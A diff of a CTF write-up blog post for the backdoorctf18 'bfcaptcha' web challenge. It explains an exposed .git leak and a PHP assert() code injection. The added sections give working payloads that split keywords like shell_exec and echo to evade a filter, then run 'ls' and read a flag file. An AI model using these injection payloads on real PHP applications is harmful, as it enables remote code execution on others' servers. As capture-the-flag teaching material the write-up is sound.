@@ -5,12 +5,12 @@ title: [backdoorctf18] [Web 150 - bfcaptcha]
 
 ---
 
-## Problem Description
+## A. Problem Description
 
-### Category : Web Exploitation
-### Points : 150 pts
-### Tags : Remote Code Execution, Brainfuck, .git
-### Language : PHP
+#### Category : Web Exploitation
+#### Points : 150 pts
+#### Tags : Remote Code Execution, Brainfuck, .git
+#### Language : PHP
 
 Target : http://51.15.73.163:13335/index.php
 
@@ -20,9 +20,9 @@ Here is the snapshot of the web
 
 ![an image alt text]({{ awidardi.github.io }}/images/ctf/2018-03-20-backdoorctf18-web150/problem.PNG "Problem's Snapshot")
 
-## Reconnaissance and Scanning Vulnerabilities
+## B. Reconnaissance and Scanning Vulnerabilities
 
-### .git exploitation
+#### .git exploitation
 
 From the problem's description, it is said that the web administrator loves to version control and blah blah blah. From this sentence, i have some feeling about versioning. 
 Thus I tried some file backup like
@@ -187,7 +187,7 @@ Can y0u print something out of this brain-fucking c0de?<br>
 </html>
 
 ```
-### Analyzing the code
+#### Analyzing the code
 
 By analyzing the code given above, we could get some informations 
 * The flag is probably in $random_flag_name
@@ -246,3 +246,96 @@ function is_clean($input){
 }
 ```
 
+From those 2 codes, we can conclude that after our answer is being input, our input is checked by function is_clean. If our input is "clean", we can assert the value of real_ans with our answer. Now analyzing this code 
+
+```php
+assert("'$real_ans' === '$user_ans'")
+```
+Since assert function will evaluate the string inside that function, we can see that our input is directly checked with variable real_ans without any filter. Thus this could cause Remote Code Execution (RCE).
+
+So let's try to give our input like this $user_ans 
+
+```php
+<answer>' and assert("ec"."ho 'test'") and '1
+// <answer> is the real answer after evaluating the brainfuck code, so we still have to interpret that code.
+```
+If we insert above payload into our answer form, we should have our code to be like this 
+
+```php
+assert("
+	'$real_ans' === '<answer>' and 
+	assert("ec"."ho 'test'") 
+	and '1'
+	") 
+and $_SESSION['count'] +=1 or (handle_invalid_captcha_ans() or $invalid_ans = 1);
+```
+
+See? We aim to try RCE with another assert in that answer variable. Since echo is banned and filtered by function is_clean, so we could split "echo 'test'" into "ec"."ho 'test'"
+
+## C. Exploitation
+
+#### First Payload
+
+```php
+<answer>' and assert("ec"."ho 'test'") and '1
+
+```
+
+We have two form, for the first, we are given the free captcha to be input. Just see at message 'Type '663716' for the given captcha'. So let's try our first exploit, by injecting above code into answer form, we can get 
+
+```html
+test
+Can y0u print something out of this brain-fucking c0de?
+++++++++++[ > +++++++++++ < -]>++++++++.[-]++++++++++[ > +++++++++++ < -]>+.[-]++++++++++[ > ++++++++++ < -]>+++++.[-]++++++++++[ > ++++++++++ < -]>.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > ++++++++++ < -]>+++++++++.[-]++++++++++[ > +++++++++ < -]>+++++++.[-]++++++++++[ > ++++++++++ < -]>+++++.[-]++++++++++[ > +++++++++++ < -]>.[-]++++++++++[ > ++++ < -]>.[-]++++++++++[ > ++++ < -]>+.[-]++++++++++[ > ++++++++++++ < -]>+++.[-]++++++++++[ > + < -]>.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > ++++++++++ < -]>+.[-]++++++++++[ > ++++++++++++ < -]>.[-]++++++++++[ > +++++++++++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > ++++++ < -]>+.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++++ < -]>+++.[-]++++++++++[ > +++++ < -]>++++++.[-]++++++++++[ > +++++ < -]>++.[-]++++++++++[ > +++++ < -]>+.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > ++++ < -]>+++.[-]++++++++++[ > +++++ < -]>+++.[-]++++++++++[ > ++++ < -]>++++++++.[-]++++++++++[ > +++++ < -]>+++++++.[-]++++++++++[ > +++++ < -]>+++.[-]++++++++++[ > +++++ < -]>+.[-]++++++++++[ > ++++ < -]>+++.[-]++++++++++[ > +++++ < -]>+++.[-]++++++++++[ > +++++ < -]>+.[-]++++++++++[ > +++++ < -]>++++.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > +++++ < -]>+.[-]++++++++++[ > ++++ < -]>++.[-]++++++++++[ > +++++ < -]>.[-]++++++++++[ > +++++ < -]>.[-]++++++++++[ > +++++ < -]>+++.[-]++++++++++[ > ++++ < -]>+++++++++.[-]++++++++++[ > ++++ < -]>+++++++++.[-]++++++++++[ > ++++ < -]>+++.[-]++++++++++[ > +++++ < -]>+++++++.[-]++++++++++[ > +++++ < -]>++++++.[-]++++++++++[ > +++++ < -]>++++.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > ++++ < -]>++++++++.[-]++++++++++[ > ++++ < -]>+++.[-]++++++++++[ > +++++ < -]>+++.[-]++++++++++[ > +++++ < -]>++.[-]++++++++++[ > +++++ < -]>++.[-]++++++++++[ > +++++ < -]>++++.[-]++++++++++[ > +++++ < -]>++++.[-]++++++++++[ > ++++ < -]>+++.[-]++++++++++[ > ++++ < -]>+++++++++.[-]++++++++++[ > ++++ < -]>++++++++.[-]++++++++++[ > +++++ < -]>.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > ++++ < -]>++++++++.[-]++++++++++[ > ++++ < -]>++.[-]++++++++++[ > +++++ < -]>++.[-]++++++++++[ > +++++ < -]>+.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > ++++ < -]>+++++++++.[-]++++++++++[ > +++++ < -]>++.[-]++++++++++[ > ++++ < -]>+++.[-]++++++++++[ > +++++ < -]>++.[-]++++++++++[ > +++++ < -]>+.[-]++++++++++[ > +++++ < -]>.[-]++++++++++[ > +++++ < -]>.[-]++++++++++[ > +++++ < -]>++++++.[-]++++++++++[ > + < -]>.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++++++++++ < -]>++.[-]++++++++++[ > +++++++++++ < -]>++++.[-]++++++++++[ > ++++++++++ < -]>+++++.[-]++++++++++[ > +++++++++++ < -]>.[-]++++++++++[ > +++++++++++ < -]>++++++.[-]++++++++++[ > ++++++++++ < -]>++.[-]++++++++++[ > ++++ < -]>.[-]++++++++++[ > ++++++++++ < -]>+.[-]++++++++++[ > ++++++++++++ < -]>.[-]++++++++++[ > +++++++++++ < -]>++.[-]++++++++++[ > ++++ < -]>+.[-]++++++++++[ > +++++ < -]>+++++++++.[-]++++++++++[ > + < -]>.[-]++++++++++[ > ++++++++++++ < -]>+++++.[-]
+Answer: 
+Answer the question
+ 
+
+
+Captcha: 
+Enter the captcha 
+  Submit
+e.g Type '427246' for the given captcha
+You've made 0 correct answers
+```
+
+#### Second Payload
+So out first payload is successfully ran into the php
+
+So let's try another payload to find what file are inside it
+
+Payload :
+```php
+<answer>' and assert("pr"."int she"."ll_ex"."ec('ls -lsart')") and '1
+```
+
+After inserting that payload, we can get
+![an image alt text]({{ awidardi.github.io }}/images/ctf/2018-03-20-backdoorctf18-web150/payload2.PNG "Payload 2's Snapshot")
+
+#### Third Payload
+After we see their directory, let's find out what's inside the random_flag_name.php file. So let's insert our payload to be like this
+
+```php
+<answer>' and assert("pr"."int she"."ll_ex"."ec('cat random_fl"."ag_fi"."le.p"."hp')") and '1
+
+// Don't forget that we should split word print, shell_exec, flag, and php
+```
+
+By injecting that code, we can get the flag
+![an image alt text]({{ awidardi.github.io }}/images/ctf/2018-03-20-backdoorctf18-web150/payload3.PNG "Payload 3's Snapshot")
+
+## D. Conclusion
+I think this problem is quite challenging but not difficult. We just have to be very careful with single quote and double quote characters since it may causes your code injection to be failed.
+But it is very good for you that still learning about RCE. And in this challenge, you can know how dangerous your website will be if you upload your .git file into your website.
+Please leave any comment, critics, or suggestion if you have something to say.
+
+## E. References and Tools Used
+
+#### References
+* [PHP Assert] (http://php.net/manual/en/function.assert.php)
+* [.git extracting tutorial](https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/)
+* [Code Injection] (https://www.owasp.org/index.php/Code_Injection)
+
+#### Tools Used
+* Windows Subsytem for Linux Ubuntu
+* [Brainfuck decoder] (https://www.dcode.fr/brainfuck-language)
